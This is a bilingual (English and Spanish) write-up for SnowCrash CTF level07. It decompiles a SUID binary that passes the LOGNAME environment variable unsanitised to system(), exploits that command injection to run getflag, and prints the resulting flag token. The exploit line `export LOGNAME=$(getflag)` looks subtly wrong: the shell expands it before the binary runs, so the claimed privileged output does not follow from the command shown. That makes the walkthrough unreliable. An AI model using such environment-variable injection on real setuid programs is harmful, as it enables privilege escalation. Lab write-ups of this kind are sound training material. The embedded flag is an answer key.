# Flag 07

## Tools Used:

* `ls`, `export`
* Ghidra (or any reverse engineering tool)
* Knowledge of environment variable manipulation

## Process:

Upon logging into the `level07` account, listing the directory reveals a single executable with **SUID** permissions:

```bash
level07@SnowCrash:~$ ls -la
```

Key file:

```
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

Decompiling the binary using **Ghidra** shows the following relevant code:

```c
int main(int argc, char **argv, char **envp) {
  gid_t gid = getegid();
  uid_t uid = geteuid();
  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  char *logname = getenv("LOGNAME");
  char *command;
  asprintf(&command, "/bin/echo %s", logname);
  system(command);

  return 0;
}
```

### Key observations:

1. The program retrieves the `LOGNAME` environment variable.
2. It constructs a command by passing `LOGNAME` to `/bin/echo` and runs it using `system()`.
3. Since the binary runs as `flag07`, command injection is possible through `LOGNAME`.

### Exploitation:

We inject a command by setting the `LOGNAME` environment variable to execute `getflag`:

```bash
level07@SnowCrash:~$ export LOGNAME=$(getflag)
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

The command executes with elevated privileges and prints the flag.

---

# Flag 07

## Herramientas Utilizadas:

* Comandos `ls`, `export`
* Ghidra (u otra herramienta de ingeniería inversa)
* Conocimientos sobre manipulación de variables de entorno

## Proceso:

Al iniciar sesión como `level07` y listar los archivos disponibles, se encuentra un único ejecutable con permisos **SUID**:

```bash
level07@SnowCrash:~$ ls -la
```

Archivo clave:

```
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
```

Descompilando el binario con **Ghidra** obtenemos el siguiente código relevante:

```c
int main(int argc, char **argv, char **envp) {
  gid_t gid = getegid();
  uid_t uid = geteuid();
  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  char *logname = getenv("LOGNAME");
  char *command;
  asprintf(&command, "/bin/echo %s", logname);
  system(command);

  return 0;
}
```

### Observaciones clave:

1. El programa obtiene la variable de entorno `LOGNAME`.
2. Construye un comando pasando `LOGNAME` a `/bin/echo` y lo ejecuta con `system()`.
3. Al ejecutarse con privilegios de `flag07`, es posible realizar una inyección de comandos.

### Explotación:

Inyectamos un comando configurando la variable de entorno `LOGNAME` para ejecutar `getflag`:

```bash
level07@SnowCrash:~$ export LOGNAME=$(getflag)
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

El comando se ejecuta con privilegios elevados y nos muestra la flag.

---

## Scripts Used:

None

## Flag:

```
fiumuikeil55xe9cu4dood66h
```
